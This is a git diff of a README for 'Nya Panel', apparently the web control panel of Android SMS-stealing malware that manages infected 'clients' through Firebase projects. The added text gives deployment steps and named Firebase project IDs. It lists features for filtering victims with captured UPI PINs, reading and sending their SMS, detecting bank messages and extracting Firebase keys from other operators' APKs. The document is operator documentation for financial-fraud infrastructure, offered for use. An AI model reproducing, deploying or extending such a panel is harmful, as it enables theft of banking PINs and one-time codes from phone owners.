@@ -1,37 +1,45 @@
-# Rebel Panel
+# Nya Panel — Multi Firebase Web
 
-Telegram bot + mobile web panel for device management.
+Web version of **Nya Panel APK** (`nyapanel.apk`) with **multi-Firebase** support.
 
 ## Files
 
 | File | Purpose |
 |------|---------|
-| `rebel.py` | Telegram bot |
-| `mobile.php` | Mobile web panel |
-| `rebel_bot_lib.php` | Key/session auth (required by mobile.php) |
-| `rebel_keys.json` | Auto-created key store |
+| `index.php` | Redirect → `nya.php` |
+| `nya.php` | Main panel — PIN clients, SMS, multi-FB switch |
+| `admin.php` | Desktop admin (multi-Firebase CRUD) |
+| `mobile.php` | Rebel mobile panel (alternate) |
+| `firebase_defaults.js` | Default Firebase projects (Nya + God8) |
+| `rebel_firebase.json` | Server-side Firebase registry |
+| `rebel_bot_lib.php` | Firebase REST, SMS send, schema detection |
+| `sex.php` | SMS token / webhook API hub |
 
-## Setup
+## Default Firebase projects
 
-1. Upload all files to your PHP host (AlwaysData, etc.)
-2. Install Python deps: `pip install pyTelegramBotAPI aiohttp aiofiles`
-3. Run bot: `python rebel.py`
-4. Generate a web access key (see below) and login on `mobile.php`
+1. **Nya Panel** — `hdjdjdj-a73f2` · `clients/` node (same as nyapanel.apk)
+2. **God8 Chatee** — `god8-208ac` · `clients/` node
 
-## Generate access key
+Add more via **Firebase tab** → paste URL + API key, or edit `rebel_firebase.json`.
 
-Create a key manually or via PHP:
+## Deploy (PHP hosting)
 
-```php
-<?php
-require 'rebel_bot_lib.php';
-echo rebel_create_key('web', 1, 30);
+Upload `rebel-panel/` folder to your server (AlwaysData, cPanel, VPS with nginx+php-fpm).
+
+```
+https://yourdomain.com/rebel-panel/nya.php
 ```
 
-Or add `/genkey` command to `rebel.py` (recommended).
+Requirements: PHP 7.4+ with `curl`, `json` extensions.
 
-## Notes
+## Features (like Nya APK)
 
-- `mobile.php` auth endpoint: `?rebel_auth=1`
-- APK keys (`APK-...`) cannot login on web — use `WEB-...` keys
-- Keep `rebel_keys.json` writable by PHP
+- **PIN filter default** — shows only clients with UPI PIN / pin fields
+- Search "Only Pin clients"
+- Multi-Firebase combined view or filter by project
+- Device info, SMS inbox, send SMS
+- Bank SMS detection
+
+## APK extract
+
+Upload any admin APK on Firebase tab → auto-extract Firebase URL + API key from APK.
